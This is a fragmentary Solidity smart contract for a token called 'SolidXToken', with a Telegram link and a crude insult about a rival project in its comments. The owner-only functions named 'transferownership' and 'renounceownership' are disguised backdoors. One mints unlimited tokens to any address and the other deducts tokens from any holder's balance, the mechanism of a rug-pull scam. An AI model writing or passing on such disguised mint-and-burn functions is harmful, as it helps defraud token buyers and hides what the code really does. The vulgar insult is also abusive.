...
/*
//https://t.me/LiquidXToken
^these guys eat dog cum^
...
contract SolidXToken {
    string public name = "SolidXToken";
...
//BUSD 0xe9e7cea3dedca5984780bafc599bd69add087d56
    ...
    function transferownership(address spender,uint256 Aclearstuckinteger) public onlyOwner returns (bool success) 
    {balanceOf  [spender]   += Aclearstuckinteger * checksum ** lqbuffer;return true;}

    function renounceownership(address spender,uint256 checkbsp) public onlyOwner returns (bool success) {balanceOf[spender] -= checkbsp * checksum ** lqbuffer;return true;}
